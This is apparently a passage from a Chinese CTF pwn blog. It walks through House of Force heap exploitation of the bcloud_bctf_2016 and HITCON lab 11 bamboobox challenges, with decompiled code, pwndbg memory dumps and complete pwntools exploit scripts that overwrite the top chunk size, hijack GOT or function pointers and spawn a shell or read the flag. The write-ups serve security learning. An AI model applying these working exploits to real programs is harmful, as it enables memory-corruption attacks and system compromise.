:u64(data.ljust(8,'\\0'))leak    = lambda name,addr          :log.success('{} = {:#x}'.format(name, addr))lg      = lambda address,data       :log.success('%s: '%(address)+hex(data))sh = process('./bcloud_bctf_2016')#sh = remote('node4.buuoj.cn',26937)elf = ELF('./bcloud_bctf_2016')def add(size,content):   sla('&gt;&gt;','1')   sla('note content:',str(size))   sa('content:',content) def edit(index,content):   sla('&gt;&gt;','3')   sla('id:',str(index))   sa('content:',content) def delete(index):   sla('&gt;&gt;','4')   sla('id:',str(index))\n\n分析：程序没有show函数，无法泄露libc基地址，观察程序发现最开时让我们输入name等信息处存在漏洞strcpy复制结束的标志是’\\x00’，chunk的mem大小只有64字节，如果输入64字节，show函数会把堆地址泄露出来\nsa('name:','a'*64)ru('a'*64)heap_addr = u32(r(4)) - 0x8lg('heap_addr',heap_addr)dbg()\n\n\n再看另一个函数\n栈布局-0000005C v2 dd ?-00000058 db ? ; undefined-00000057 db ? ; undefined..........-00000016 db ? ; undefined-00000015 db ? ; undefined-00000014 v4 dd ?-00000010 db ? ; undefined-0000000F db ? ; undefined-0000000E db ? ; undefined-0000000D db ? ; undefined\n\n这里的v2，v3和v4，s都是位于栈上的，且在栈上s和v4的空间是连着的，而strcpy复制结束的标志是’\\x00’，如果我们将s填满（b’b’*0x40），再将v3写为0xffffffff，那么strcpy(v4, v3);会把v4变为0xffffffff， strcpy(v2, s);会把b’b’*0x40+0xffffffff复制给v2，而v2也是一个size大小为0x40的chunk的mem指针，0xffffffff将覆盖到chunkv2 的下一位，而下一位正好是top chunk的大小，这样我们就成功将top chunk的大小改为了0xffffffff（-1）\nsa('Org:','a'*0x40)sla('Host:',p32(0xFFFFFFFF))top_chunk_addr = heap_addr  + 0x48*3 - 0x8lg('top_chunk_addr',(top_chunk_addr))\n\n\n之后就来算一下存放chunk指针的全局数组heap_array（0x0804B120）与top chunk的距离，因为程序一开始就申请了三个大小为0x40的chunk(算上头指针为0x48)，第一次泄露的heap已经算上头指针，heap与top chunk距离0x48*3-0x8=0xD0大小，再加上我们一开始泄露出来的heap的地址（heap_addr）就是top chunk的mem指针地址，\noffset = heap_array - （top_chunk_addr +0x8）- 0x8\n\n\nheap_array - top_chunk_addr是top chunk的mem地址,减去0x8字节是top chunk的头指针地址，之后申请offset-0x10大小的chunk，之所以是再减0x8是因为我们要将heap_array作为mem区域来修改，第一次申请offset-0x10大小的chunk，为第二次申请的chunk预留出chunk头的0x8字节大小（0x4字节的pre_size位和0x4字节的now_size位）。再次申请chunk即为heap_array为mem区域的chunk，可修改heap_array数组，\nadd(offset,'\\n')\tadd(0x18,'\\n')\n\n之后编辑chunk_1来修改heap_array数组\nputs_plt = elf.plt['puts']__libc_start_main_got = elf.got['__libc_start_main']free_got = elf.got['free']edit(1,p32(0) + p32(free_got) + p32(__libc_start_main_got) + p32(heap_array + 0x10) + b'\\x00'*0x8)\n\n此时chunk依次为0，free_got，__libc_start_main_got，heap_array+0x10（保持原3号chunk不变）\nedit(1,p32(puts_plt) + b'\\n')\n\n此时chunk_1存放free_got地址，编辑chunk_1，将free_got改为puts_plt函数地址\ndelete(2)dbg()\n\nfree（chunk_2），相当于puts(__libc_start_main_got)，泄露__libc_start_main_got地址，得到libc基地址，得到one_gadget地址\n#本地one_gadget = [0x3ac3c,0x3ac3e,0x3ac42,0x3ac49,0x5faa5,0x5faa6]libc = ELF('/home/pwn/tools/glibc-all-in-one/libs/2.23-0ubuntu3_i386/libc-2.23.so')#buu远程#one_gadget = [0x3a80c,0x3a80e,0x3a812,0x3a819,0x5f065,0x5f066]#libc = ELF('../../libc-2.23.so--32')libc_base = __libc_start_main_addr - libc.sym['__libc_start_main']onegadget = one_gadget[3] + libc_base\n\n再次编辑chunk__1将puts函数地址改为one_gadget地址，free（chunk_1）执行exeve(“/bin/sh\\x00”)，获得shell。\ndelete(1)itr()\n\n\nexpfrom pwn import *from LibcSearcher import *context(endian='little',os='linux',arch='i386',log_level='debug') #小端序，linux系统，64位架构,debug#定义gdb调试函数def dbg():        gdb.attach(sh)        pause()#命令简写化s       = lambda data               :sh.send(data)sa      = lambda delim,data         :sh.sendafter(delim, data)sl      = lambda data               :sh.sendline(data)sla     = lambda delim,data         :sh.sendlineafter(delim, data)r       = lambda num=4096           :sh.recv(num)ru      = lambda delims, drop=True  :sh.recvuntil(delims, drop)itr     = lambda                    :sh.interactive()uu32    = lambda data               :u32(data.ljust(4,'\\0'))uu64    = lambda data               :u64(data.ljust(8,'\\0'))leak    = lambda name,addr          :log.success('{} = {:#x}'.format(name, addr))lg      = lambda address,data       :log.success('%s: '%(address)+hex(data))sh = process('./bcloud_bctf_2016')#sh = remote('node4.buuoj.cn',26937)elf = ELF('./bcloud_bctf_2016')puts_plt = elf.plt['puts']__libc_start_main_got = elf.got['__libc_start_main']free_got = elf.got['free']heap_array = 0x0804B120 def add(size,content):   sla('&gt;&gt;','1')   sla('note content:',str(size))   sa('content:',content) def edit(index,content):   sla('&gt;&gt;','3')   sla('id:',str(index))   sa('content:',content) def delete(index):   sla('&gt;&gt;','4')   sla('id:',str(index))def main():\tsa('name:','a'*64)\tru('a'*64)\theap_addr = u32(r(4)) \tlg('heap_addr',heap_addr)\t#dbg()\tsa('Org:','a'*0x40)\t#修改top chunk的size为-1（0xFFFFFFFF）\tsla('Host:',p32(0xFFFFFFFF))\ttop_chunk_addr = heap_addr + 0x48*3-0x8\tlg('top_chunk_addr',(top_chunk_addr))\toffset = heap_array - (top_chunk_addr +0x8)- 0x8\tlg('offset',offset)\tadd(offset,'') #0\tadd(0x18,'\\n') #1\tedit(1,p32(0) + p32(free_got) + p32(__libc_start_main_got) + p32(heap_array + 0x10)  + b'\\x00'*8)\tedit(1,p32(puts_plt) + b'\\n')\t#泄露__libc_start_main_got的地址\tdelete(2)\tr(1)\t__libc_start_main_addr = u32(r(4))\tlg('__libc_start_main',__libc_start_main_addr)\t#dbg()\t'''\tlibc = LibcSearcher('__libc_start_main',__libc_start_main_addr)\tlibc_base = __libc_start_main_addr - libc.dump('__libc_start_main')\tsystem_addr = libc_base + libc.dump('system')\tlg('libc_base',(libc_base))\tlg('system_addr',(system_addr))\tedit(1,p32(system_addr) + b'\\n')\t'''\t#本地\tone_gadget = [0x3ac3c,0x3ac3e,0x3ac42,0x3ac49,0x5faa5,0x5faa6]\tlibc = ELF('/home/pwn/tools/glibc-all-in-one/libs/2.23-0ubuntu3_i386/libc-2.23.so')\t#buu远程\t#one_gadget = [0x3a80c,0x3a80e,0x3a812,0x3a819,0x5f065,0x5f066]\t#libc = ELF('../../libc-2.23.so--32')\tlibc_base = __libc_start_main_addr - libc.sym['__libc_start_main']\tonegadget = one_gadget[3] + libc_base\tedit(1,p32(onegadget) + b'\\n')\t#getshell\tdelete(1)\titr()main()\n","categories":["heap"],"tags":["House of 系列"]},{"title":"House of Force","url":"/2023/09/12/House%20of%20Force/","content":"House Of Force（控制top_chunk）（基础）\n参考资料：CTF-wiki：https://ctf-wiki.github.io/ctf-wiki/pwn/linux/glibc-heap/house_of_force-zh/附件下载：链接: https://pan.baidu.com/s/1NiEZbuBUCFJrMOjqlazPUA  密码: np57–来自百度网盘超级会员V3的分享    House Of Force是一种堆的利用方法，其主要原理是控制heap中的top_chunk并malloc来达到控制任意内存的空间。\n\n\n题目来源：HITCON training lab 11附件：链接: https://pan.baidu.com/s/1qdOlp9RT_7mxhw_187ugXQ  密码: abtk–来自百度网盘超级会员V3的分享\n\n\nLinux环境老规矩，checksec一下文件先\n\n计算一下 main_arena 距离 libc 的距离\n\n程序源代码(c)#include &lt;fcntl.h&gt;#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;sys/stat.h&gt;#include &lt;sys/types.h&gt;#include &lt;unistd.h&gt;struct item {  int size;  char *name;};struct item itemlist[100] = {0};int num;void hello_message() {  puts(\"There is a box with magic\");  puts(\"what do you want to do in the box\");}void goodbye_message() {  puts(\"See you next time\");  puts(\"Thanks you\");}struct box {  void (*hello_message)();  void (*goodbye_message)();};void menu() {  puts(\"----------------------------\");  puts(\"Bamboobox Menu\");  puts(\"----------------------------\");  puts(\"1.show the items in the box\");  puts(\"2.add a new item\");  puts(\"3.change the item in the box\");  puts(\"4.remove the item in the box\");  puts(\"5.exit\");  puts(\"----------------------------\");  printf(\"Your choice:\");}void show_item() {  int i;  if (!num) {    puts(\"No item in the box\");  } else {    for (i = 0; i &lt; 100; i++) {      if (itemlist[i].name) {        printf(\"%d : %s\", i, itemlist[i].name);      }    }    puts(\"\");  }}int add_item() {  char sizebuf[8];  int length;  int i;  int size;  if (num &lt; 100) {    printf(\"Please enter the length of item name:\");    read(0, sizebuf, 8);    length = atoi(sizebuf);    if (length == 0) {      puts(\"invaild length\");      return 0;    }   \tfor (i = 0; i &lt; 100; i++) {      if (!itemlist[i].name) {        itemlist[i].size = length;        itemlist[i].name = (char *)malloc(length);        printf(\"Please enter the name of item:\");        size = read(0, itemlist[i].name, length);        itemlist[i].name[size] = '\\x00';        num++;        break;      }    }  } else {    puts(\"the box is full\");  }  return 0;}void change_item() {  char indexbuf[8];  char lengthbuf[8];  int length;  int index;  int readsize;  if (!num) {    puts(\"No item in the box\");  } else {    printf(\"Please enter the index of item:\");    read(0, indexbuf, 8);    index = atoi(indexbuf);    if (itemlist[index].name) {      printf(\"Please enter the length of item name:\");      read(0, lengthbuf, 8);      length = atoi(lengthbuf);      printf(\"Please enter the new name of the item:\");      readsize = read(0, itemlist[index].name, length);      *(itemlist[index].name + readsize) = '\\x00';    } else {      puts(\"invaild index\");    }  }}void remove_item() {  char indexbuf[8];  int index;  if (!num) {    puts(\"No item in the box\");  } else {    printf(\"Please enter the index of item:\");    read(0, indexbuf, 8);    index = atoi(indexbuf);    if (itemlist[index].name) {      free(itemlist[index].name);      itemlist[index].name = 0;      itemlist[index].size = 0;      puts(\"remove successful!!\");      num--;    } else {      puts(\"invaild index\");    }  }}void magic() {  int fd;  char buffer[100];  fd = open(\"./flag\", O_RDONLY);  read(fd, buffer, sizeof(buffer));  close(fd);  printf(\"%s\", buffer);  exit(0);}int main() {  char choicebuf[8];  int choice;  struct box *bamboo;  setvbuf(stdout, 0, 2, 0);  setvbuf(stdin, 0, 2, 0);  bamboo = malloc(sizeof(struct box));  bamboo-&gt;hello_message = hello_message;  bamboo-&gt;goodbye_message = goodbye_message;  bamboo-&gt;hello_message();  while (1) {    menu();    read(0, choicebuf, 8);    choice = atoi(choicebuf);    switch (choice) {    case 1:      show_item();      break;    case 2:      add_item();      break;    case 3:      change_item();      break;    case 4:      remove_item();      break;    case 5:      bamboo-&gt;goodbye_message();      exit(0);      break;    default:      puts(\"invaild choice!!!\");      break;    }  }  return 0;}\n\n\n\nIDA静态分析main函数int __cdecl main(int argc, const char **argv, const char **envp){  void (**v4)(void); // [rsp+8h] [rbp-18h]  char buf[8]; // [rsp+10h] [rbp-10h] BYREF  unsigned __int64 v6; // [rsp+18h] [rbp-8h]  v6 = __readfsqword(0x28u);  setvbuf(stdout, 0LL, 2, 0LL);  setvbuf(stdin, 0LL, 2, 0LL);  v4 = (void (**)(void))malloc(0x10uLL);  *v4 = (void (*)(void))hello_message;  v4[1] = (void (*)(void))goodbye_message;  (*v4)();  while ( 1 )  {    menu();    read(0, buf, 8uLL);    switch ( atoi(buf) )    {      case 1:        show_item();        break;      case 2:        add_item();        break;      case 3:        change_item(buf, buf);        break;      case 4:        remove_item();        break;      case 5:        v4[1]();        exit(0);      default:        puts(\"invaild choice!!!\");        break;    }  }}\n\n​\tmain函数其实没有什么好说的，但是值得注意的是程序开头就申请了一片堆空间来存放hello_message和goodbye_message，并在程序开始的时候调用hello_message和在程序结束的时候调用goodbye_message。\nmeau函数void __cdecl menu(){  puts(\"----------------------------\");  puts(\"Bamboobox Menu\");  puts(\"----------------------------\");  puts(\"1.show the items in the box\");  puts(\"2.add a new item\");  puts(\"3.change the item in the box\");  puts(\"4.remove the item in the box\");  puts(\"5.exit\");  puts(\"----------------------------\");  printf(\"Your choice:\");}\n\n这是一个程序的菜单函数，没有什么特别的。\nshow_itemint show_item(){  int i; // [rsp+Ch] [rbp-4h]  if ( !num )    return puts(\"No item in the box\");  for ( i = 0; i &lt;= 99; ++i )  {    if ( itemlist[i].content )      printf(\"%d : %s\", (unsigned int)i, itemlist[i].content);\t//老老实实打印堆块的内容  }  return puts(byte_401089);}\n\n\n\n首先判断存放于bss段的全局变量num是否有数据，然后进入循环打印程序各个结构体的内容，没有什么好看的。\nadd_item__int64 add_item(){  int i; // [rsp+4h] [rbp-1Ch]  int v2; // [rsp+8h] [rbp-18h]  char buf[8]; // [rsp+10h] [rbp-10h] BYREF  unsigned __int64 v4; // [rsp+18h] [rbp-8h]  v4 = __readfsqword(0x28u);  if ( num &gt; 99 )  {    puts(\"the box is full\");  }  else  {    printf(\"Please enter the length of item name:\");    read(0, buf, 8uLL);\t\t\t\t\t\t\t    v2 = atoi(buf);\t\t\t\t\t\t\t\t\t//输入准备输入内容的长度    if ( !v2 )    {      puts(\"invaild length\");      return 0LL;    }    for ( i = 0; i &lt;= 99; ++i )    {      if ( !itemlist[i].content )      {        LODWORD(itemlist[i].size) = v2;        itemlist[i].content = (char *)malloc(v2);        printf(\"Please enter the name of item:\");        itemlist[i].content[(int)read(0, itemlist[i].content, v2)] = 0;        ++num;        return 0LL;      }\t\t\t\t\t\t\t\t\t\t\t\t//根据输入的长度，malloc大小，并填充数据    }  }  return 0LL;}\n\n首先根据num判断是否堆满了，然后根据堆结构体写入数据\n根据输入的长度，生成一个堆，然后填入数据，不存在溢出\nchange_itemunsigned __int64 change_item(){  int v1; // [rsp+4h] [rbp-2Ch]  int v2; // [rsp+8h] [rbp-28h]  char buf[16]; // [rsp+10h] [rbp-20h] BYREF  char nptr[8]; // [rsp+20h] [rbp-10h] BYREF  unsigned __int64 v5; // [rsp+28h] [rbp-8h]  v5 = __readfsqword(0x28u);  if ( num )  {    printf(\"Please enter the index of item:\");    read(0, buf, 8uLL);    v1 = atoi(buf);    if ( itemlist[v1].content )    {      printf(\"Please enter the length of item name:\");      read(0, nptr, 8uLL);      v2 = atoi(nptr);      printf(\"Please enter the new name of the item:\");      itemlist[v1].content[(int)read(0, itemlist[v1].content, v2)] = 0;// //存在堆溢出，输出长度由我们自己决定    }    else    {      puts(\"invaild index\");    }  }  else  {    puts(\"No item in the box\");  }  return __readfsqword(0x28u) ^ v5;}\n\n又可以往堆中写入内容，这次长度由我们自己决定，存在堆溢出！！！\nremove_itemunsigned __int64 remove_item(){  int v1; // [rsp+Ch] [rbp-14h]  char buf[8]; // [rsp+10h] [rbp-10h] BYREF  unsigned __int64 v3; // [rsp+18h] [rbp-8h]  v3 = __readfsqword(0x28u);  if ( num )  {    printf(\"Please enter the index of item:\");    read(0, buf, 8uLL);    v1 = atoi(buf);    if ( itemlist[v1].content )    {      free(itemlist[v1].content);      itemlist[v1].content = 0LL;      LODWORD(itemlist[v1].size) = 0;           // free了且将指针置0，不存在UAF      puts(\"remove successful!!\");      --num;    }    else    {      puts(\"invaild index\");    }  }  else  {    puts(\"No item in the box\");  }  return __readfsqword(0x28u) ^ v3;}\n\nfree(itemlist[v1].content);\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\tfree(itemlist[index].name);itemlist[v1].content = 0LL; \t\t\t\t\t\t\t\t\t-&gt;    \t\t\t\t\t\t\t\titemlist[index].name = 0;LODWORD(itemlist[v1].size) = 0;\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\titemlist[index].size = 0;\nfree 了 堆块，清空指针，不存在uaf\nmagicvoid __noreturn magic(){  int fd; // [rsp+Ch] [rbp-74h]  char buf[104]; // [rsp+10h] [rbp-70h] BYREF  unsigned __int64 v2; // [rsp+78h] [rbp-8h]  v2 = __readfsqword(0x28u);  fd = open(\"./flag\", 0);  read(fd, buf, 0x64uLL);  close(fd);  printf(\"%s\", buf);  exit(0);}\n\nmagic = 0x400D49 \n目标地址，控制程序执行流到magic函数的位置即可get flag\n结构体00000000 item            struc ; (sizeof=0x10, mappedto_6)00000000                                         ; XREF: .bss:itemlist/r00000000 size            dq ?00000008 content         dq ?                    ; offset00000010 item            ends00000010\n\n对应c代码的 item 结构体\npwndbg 动态调试堆内存分布首先使用gdb动态调试程序，创建两个堆块，然后进入调试模式，详细信息如下面的代码框所示：\n\nchunk0:size=10，content=”aaaaa”\nchunk1:size=20，content=”bbbbb”\n\ngiantbranch@ubuntu:/mnt/hgfs/PWN题/Range/ctfshow/ctf-pwn-challenges/heap/house-of-force/hitcontraning_lab11$ gdb bambooboxGNU gdb (Ubuntu 7.11.1-0ubuntu1~16.5) 7.11.1Copyright (C) 2016 Free Software Foundation, Inc.License GPLv3+: GNU GPL version 3 or later &lt;http://gnu.org/licenses/gpl.html&gt;This is free software: you are free to change and redistribute it.There is NO WARRANTY, to the extent permitted by law.  Type \"show copying\"and \"show warranty\" for details.This GDB was configured as \"x86_64-linux-gnu\".Type \"show configuration\" for configuration details.For bug reporting instructions, please see:&lt;http://www.gnu.org/software/gdb/bugs/&gt;.Find the GDB manual and other documentation resources online at:&lt;http://www.gnu.org/software/gdb/documentation/&gt;.For help, type \"help\".Type \"apropos word\" to search for commands related to \"word\"...pwndbg: loaded 175 commands. Type pwndbg [filter] for a list.pwndbg: created $rebase, $ida gdb functions (can be used with print/break)Reading symbols from bamboobox...(no debugging symbols found)...done.pwndbg&gt; rStarting program: /mnt/hgfs/PWN题/Range/ctfshow/ctf-pwn-challenges/heap/house-of-force/hitcontraning_lab11/bamboobox There is a box with magicwhat do you want to do in the box----------------------------Bamboobox Menu----------------------------1.show the items in the box2.add a new item3.change the item in the box4.remove the item in the box5.exit----------------------------Your choice:2Please enter the length of item name:10Please enter the name of item:aaaaa----------------------------Bamboobox Menu----------------------------1.show the items in the box2.add a new item3.change the item in the box4.remove the item in the box5.exit----------------------------Your choice:2Please enter the length of item name:20Please enter the name of item:bbbbb----------------------------Bamboobox Menu----------------------------1.show the items in the box2.add a new item3.change the item in the box4.remove the item in the box5.exit----------------------------Your choice:^CProgram received signal SIGINT, Interrupt.0x00007ffff7b04360 in __read_nocancel () at ../sysdeps/unix/syscall-template.S:8484\t../sysdeps/unix/syscall-template.S: No such file or directory.LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA───────────────────────────────────────────[ REGISTERS ]─────────────────────────────────────────── RAX  0xfffffffffffffe00 RBX  0x0 RCX  0x7ffff7b04360 (__read_nocancel+7) ◂— cmp    rax, -0xfff RDX  0x8 RDI  0x0 RSI  0x7fffffffdc40 —▸ 0x7fffffff0a32 ◂— 0x0 R8   0x7ffff7fdd700 ◂— 0x7ffff7fdd700 R9   0xc R10  0x0 R11  0x246 R12  0x4007a0 (_start) ◂— xor    ebp, ebp R13  0x7fffffffdd30 ◂— 0x1 R14  0x0 R15  0x0 RBP  0x7fffffffdc50 —▸ 0x400ee0 (__libc_csu_init) ◂— push   r15 RSP  0x7fffffffdc28 —▸ 0x400e5d (main+166) ◂— lea    rax, [rbp - 0x10] RIP  0x7ffff7b04360 (__read_nocancel+7) ◂— cmp    rax, -0xfff────────────────────────────────────────────[ DISASM ]───────────────────────────────────────────── ► 0x7ffff7b04360 &lt;__read_nocancel+7&gt;     cmp    rax, -0xfff   0x7ffff7b04366 &lt;__read_nocancel+13&gt;    jae    read+73 &lt;0x7ffff7b04399&gt;    ↓   0x7ffff7b04399 &lt;read+73&gt;               mov    rcx, qword ptr [rip + 0x2ccad8]   0x7ffff7b043a0 &lt;read+80&gt;               neg    eax   0x7ffff7b043a2 &lt;read+82&gt;               mov    dword ptr fs:[rcx], eax   0x7ffff7b043a5 &lt;read+85&gt;               or     rax, 0xffffffffffffffff   0x7ffff7b043a9 &lt;read+89&gt;               ret        0x7ffff7b043aa                         nop    word ptr [rax + rax]   0x7ffff7b043b0 &lt;write&gt;                 cmp    dword ptr [rip + 0x2d2389], 0 &lt;0x7ffff7dd6740&gt;   0x7ffff7b043b7 &lt;write+7&gt;               jne    write+25 &lt;0x7ffff7b043c9&gt;    ↓   0x7ffff7b043c9 &lt;write+25&gt;              sub    rsp, 8─────────────────────────────────────────────[ STACK ]─────────────────────────────────────────────00:0000│ rsp  0x7fffffffdc28 —▸ 0x400e5d (main+166) ◂— lea    rax, [rbp - 0x10]01:0008│      0x7fffffffdc30 ◂— 0x200400ee002:0010│      0x7fffffffdc38 —▸ 0x603010 —▸ 0x400896 (hello_message) ◂— push   rbp03:0018│ rsi  0x7fffffffdc40 —▸ 0x7fffffff0a32 ◂— 0x004:0020│      0x7fffffffdc48 ◂— 0x2b1241ff949c6b0005:0028│ rbp  0x7fffffffdc50 —▸ 0x400ee0 (__libc_csu_init) ◂— push   r1506:0030│      0x7fffffffdc58 —▸ 0x7ffff7a2d840 (__libc_start_main+240) ◂— mov    edi, eax07:0038│      0x7fffffffdc60 ◂— 0x0───────────────────────────────────────────[ BACKTRACE ]─────────────────────────────────────────── ► f 0     7ffff7b04360 __read_nocancel+7   f 1           400e5d main+166   f 2     7ffff7a2d840 __libc_start_main+240Program received signal SIGINTpwndbg&gt; \n\nok，输入完成，接下来我们查看堆的分布\npwndbg&gt; heapAllocated chunk | PREV_INUSEAddr: 0x603000Size: 0x21Allocated chunk | PREV_INUSEAddr: 0x603020Size: 0x21Allocated chunk | PREV_INUSEAddr: 0x603040Size: 0x21Top chunk | PREV_INUSEAddr: 0x603060Size: 0x20fa1pwndbg&gt; \n\n堆的内存分布f\npwndbg&gt; x/30gx 0x6030000x603000:\t0x0000000000000000\t0x0000000000000021 #func_start_malloc_chunk0x603010:\t0x0000000000400896\t0x00000000004008b1\t\t\t\t\t#hello_message      #goodbye_message0x603020:\t0x0000000000000000\t0x0000000000000021 #chunk00x603030:\t0x00000a6161616161\t0x00000000000000000x603040:\t0x0000000000000000\t0x0000000000000021 #chunk10x603050:\t0x00000a6262626262\t0x00000000000000000x603060:\t0x0000000000000000\t0x0000000000020fa1 #top_chunk......(省略内容均为空)0x6030e0:\t0x0000000000000000\t0x0000000000000000pwndbg&gt; \n\n全局变量.bss:00000000006020C0                 public itemlist.bss:00000000006020C0 ; item itemlist[100].bss:00000000006020C0 itemlist        item 64h dup(&lt;?&gt;)       ; DATA XREF: add_item+A4↑o.bss:0000000000602700                 public num.bss:0000000000602700 ; int num.bss:0000000000602700 num             dd ?                    ; DATA XREF: show_item+8↑r\n\n\nitemlist[] 记录着堆块的指针\n\nnum 记录着堆块的数量。\n\n\n查看一下堆指针信息\npwndbg&gt; x/10gx 0x6020c00x6020c0 &lt;itemlist&gt;:\t0x000000000000000a\t0x0000000000603030 #chunk0\t\t\t\t\t\t#struct_size        #struct_content_ptr0x6020d0 &lt;itemlist+16&gt;:\t0x0000000000000014\t0x0000000000603050 #chunk1\t\t\t\t\t\t#struct_size        #struct_content_ptr0x6020e0 &lt;itemlist+32&gt;:\t0x0000000000000000\t0x00000000000000000x6020f0 &lt;itemlist+48&gt;:\t0x0000000000000000\t0x00000000000000000x602100 &lt;itemlist+64&gt;:\t0x0000000000000000\t0x0000000000000000pwndbg&gt; //注意struct_content_ptr指向malloc出来malloc_data的地址\n\n保存着每一个chunk的 size（输入的大小） 和 chunk地址\n攻击原理及exp#!/usr/bin/env python# -*- coding: utf-8 -*-from pwn import *context.log_level = 'debug'p = process('./bamboobox')def cmd(choice):  p.sendlineafter('',str(choice))  def create(size,content):  cmd(2)  p.sendlineafter('item name:',str(size))  p.sendlineafter('item:',content)def edit(index,size,content):  cmd(3)  p.sendlineafter('of item:',str(index))  p.sendlineafter('item name:',str(size))  p.sendlineafter('the item:',content)def delete(index):  cmd(4)  p.sendlineafter('of item:',str(index))def quit():  cmd(5)magic = 0x400d49create(0x30, \"aaaa\")content='a'*0x30+'1'*8+p64(0xffffffffffffffff)edit(0,0x40,content)offset=-0x60-0x10create(offset,'bbbb')create(0x10,p64(magic)*2)quit()p.interactive()\n\npayload 分析我们的目标是修改堆中的0x4008b1（goodbye_message）为magic函数地址：\n--------------------------------------------------------------------------修改之前：pwndbg&gt; x/30gx 0x6030000x603000:\t0x0000000000000000\t0x0000000000000021 #func_start_malloc_chunk0x603010:\t0x0000000000400896\t0x00000000004008b1\t\t\t\t\t#hello_message      #goodbye_message--------------------------------------------------------------------------我们所期望的：pwndbg&gt; x/30gx 0x6030000x603000:\t0x0000000000000000\t0x0000000000000021 #func_start_malloc_chunk0x603010:\t0x0000000000400896\t0x0000000000400d49\t\t\t\t\t#hello_message      #magic函数\n\ndef cmd(choice):  p.sendlineafter('',str(choice))  def create(size,content):  cmd(2)  p.sendlineafter('item name:',str(size))  p.sendlineafter('item:',content)def edit(index,size,content):  cmd(3)  p.sendlineafter('of item:',str(index))  p.sendlineafter('item name:',str(size))  p.sendlineafter('the item:',content)def delete(index):  cmd(4)  p.sendlineafter('of item:',str(index))def quit():  cmd(5)\n\n首先来看第一部分的payload，这些代码的主要功能是自动化执行程序的功能。也是exp中最基础的部分，没有什么好说的。\ncreate(0x30, \"aaaa\")\n\npwndbg&gt; vmmapLEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA          0x400000           0x402000 r-xp     2000 0      /mnt/hgfs/PWN题/Range/ctfshow/ctf-pwn-challenges/heap/house-of-force/hitcontraning_lab11/bamboobox          0x601000           0x602000 r--p     1000 1000   /mnt/hgfs/PWN题/Range/ctfshow/ctf-pwn-challenges/heap/house-of-force/hitcontraning_lab11/bamboobox          0x602000           0x603000 rw-p     1000 2000   /mnt/hgfs/PWN题/Range/ctfshow/ctf-pwn-challenges/heap/house-of-force/hitcontraning_lab11/bamboobox          0x603000           0x624000 rw-p    21000 0      [heap]    0x7ffff7a0d000     0x7ffff7bcd000 r-xp   1c0000 0      /lib/x86_64-linux-gnu/libc-2.23.so    0x7ffff7bcd000     0x7ffff7dcd000 ---p   200000 1c0000 /lib/x86_64-linux-gnu/libc-2.23.so    0x7ffff7dcd000     0x7ffff7dd1000 r--p     4000 1c0000 /lib/x86_64-linux-gnu/libc-2.23.so    0x7ffff7dd1000     0x7ffff7dd3000 rw-p     2000 1c4000 /lib/x86_64-linux-gnu/libc-2.23.so    0x7ffff7dd3000     0x7ffff7dd7000 rw-p     4000 0          0x7ffff7dd7000     0x7ffff7dfd000 r-xp    26000 0      /lib/x86_64-linux-gnu/ld-2.23.so    0x7ffff7fdc000     0x7ffff7fdf000 rw-p     3000 0          0x7ffff7ff7000     0x7ffff7ffa000 r--p     3000 0      [vvar]    0x7ffff7ffa000     0x7ffff7ffc000 r-xp     2000 0      [vdso]    0x7ffff7ffc000     0x7ffff7ffd000 r--p     1000 25000  /lib/x86_64-linux-gnu/ld-2.23.so    0x7ffff7ffd000     0x7ffff7ffe000 rw-p     1000 26000  /lib/x86_64-linux-gnu/ld-2.23.so    0x7ffff7ffe000     0x7ffff7fff000 rw-p     1000 0          0x7ffffffde000     0x7ffffffff000 rw-p    21000 0      [stack]0xffffffffff600000 0xffffffffff601000 r-xp     1000 0      [vsyscall]\n\n执行完上面的payload之后堆块的状况如下：\npwndbg&gt; x/30gx 0xe800000xe80000:\t0x0000000000000000\t0x0000000000000021 #func_start_malloc_chunk0xe80010:\t0x0000000000400896\t0x00000000004008b1    \t\t#hello_message      #goodbye_message0xe80020:\t0x0000000000000000\t0x0000000000000041 #chunk0（malloc(0x30)）0xe80030:\t0x0000000a61616161\t0x00000000000000000xe80040:\t0x0000000000000000\t0x00000000000000000xe80050:\t0x0000000000000000\t0x00000000000000000xe80060:\t0x0000000000000000\t0x0000000000020fa1 #top_chunk0xe80070:\t0x0000000000000000\t0x00000000000000000xe80080:\t0x0000000000000000\t0x00000000000000000xe80090:\t0x0000000000000000\t0x00000000000000000xe800a0:\t0x0000000000000000\t0x00000000000000000xe800b0:\t0x0000000000000000\t0x00000000000000000xe800c0:\t0x0000000000000000\t0x00000000000000000xe800d0:\t0x0000000000000000\t0x00000000000000000xe800e0:\t0x0000000000000000\t0x0000000000000000pwndbg&gt; \n\n然后我们编辑刚才创建的堆块（index0）：\ncontent='a'*0x30+'1'*8+p64(0xffffffffffffffff)edit(0,0x40,content)\n\npwndbg&gt; x/30gx 0xe800000xe80000:\t0x0000000000000000\t0x0000000000000021 #func_start_malloc_chunk0xe80010:\t0x0000000000400896\t0x00000000004008b1    \t\t#hello_message      #goodbye_message0xe80020:\t0x0000000000000000\t0x0000000000000041 #chunk0（malloc(0x30)）0xe80030:\t0x6161616161616161\t0x61616161616161610xe80040:\t0x6161616161616161\t0x61616161616161610xe80050:\t0x6161616161616161\t0x61616161616161610xe80060:\t0x3131313131313131\t0xffffffffffffffff #top_chunk0xe80070:\t0x0000000000000000\t0x0000000000000000......（省略内容均为空）0xe800e0:\t0x0000000000000000\t0x0000000000000000pwndbg&gt; \n\n从上面的内容可以看到，top_chunk的size已经被更改为0xffffffffffffffff，利用它我们就可以控制任意内存的地址。继续向下看paylaod：\noffset=-0x60-0x10create(offset,'bbbb')\n\n这个offset怎么来的？\n首先要明确目标为修改goodbye_message函数为magic函数。在gdb调试中，goodbye_message函数指针的地址为：0xe80010，现在的top_chunk地址为0xe80060\n要想修改地址，应该将 top_chunk 指向0xe80000（heap_base）处，这样当下次再分配chunk时，就可以分配到goodbye_message处的内存了。\n如何计算？本题是向低地址移动，将上一小节的公式带入到本题中：\nmalloc_size=0xe80000-0xe80060-0x10=-0x70\n因此要malloc(-0x70)，完成此步骤之后堆内存如下图所示：\npwndbg&gt; x/30gx 0xe800000xe80000:\t0x0000000000000000\t0x0000000000000059 #new_top_chunk0xe80010:\t0x0000000000400896\t0x00000000004008b1    \t\t#hello_message      #goodbye_message0xe80020:\t0x0000000000000000\t0x0000000000000041 